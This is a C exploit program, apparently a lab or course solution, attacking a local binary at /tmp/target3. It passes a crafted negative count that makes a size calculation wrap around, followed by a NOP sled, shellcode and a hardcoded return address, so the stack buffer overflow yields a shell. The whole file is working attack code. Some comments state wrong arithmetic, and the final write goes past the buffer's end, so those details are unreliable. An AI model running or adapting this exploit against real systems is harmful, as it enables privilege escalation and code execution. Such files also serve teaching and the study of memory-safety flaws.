#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP 0x90
#define SIZE 5632

int main(void)
{
  char *args[3];
  char *env[1];
  int i,j;
  long *addr_ptr;
  //create buffer of size = 5632 (struct size * 200) + 32 (to overflow into the eip)
  char evil_buf[SIZE];
  //-1 = 4294967297
  //struct size = 28
  //200*28 = 5600 then + 4 for junk and + 4 for ret address so want something > 6508
  //so what negative# * 28 will wrap around and give + 5608 (or more)? -153391488
  char *neg;
  neg = "-153391488";  //setting up count part of buffer [count],[overflow]
  //prepopulate the whole shebang with NOP's
  for(i = 0; i < SIZE - 1; i++){
	evil_buf[i] = NOP;
  }
  //place neg into the first 10 spots of buffer
  evil_buf[0] = neg[0];
  evil_buf[1] = neg[1];
  evil_buf[2] = neg[2];
  evil_buf[3] = neg[3];
  evil_buf[4] = neg[4];
  evil_buf[5] = neg[5];
  evil_buf[6] = neg[6];
  evil_buf[7] = neg[7];
  evil_buf[8] = neg[8];
  evil_buf[9] = neg[9];
  evil_buf[10] = ',';  //comma
  //place shellcode somewhere towards the end to give us a bigger target of nops to hit
  for(j = 0, i = 5500; j < sizeof(shellcode)-1; i++, j++){
	evil_buf[i] = shellcode[j];
  }
  //fill in rando ebp, adjusted for the loss of neg and ','
  evil_buf[5611] = 'A';
  evil_buf[5612] = 'B';
  evil_buf[5613] = 'C';
  evil_buf[5614] = 'D';
  //now overflow eip with address of somewhere in our nop slide, adjusted for loss of neg and ','
  evil_buf[5615] = 0xd0;
  evil_buf[5616] = 0xfe;
  evil_buf[5617] = 0xff;
  evil_buf[5618] = 0xbf;
  //terminate at size
  evil_buf[5632] = '\0';
  args[0] = TARGET; args[1] = evil_buf; args[2] = NULL;
  env[0] = NULL;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
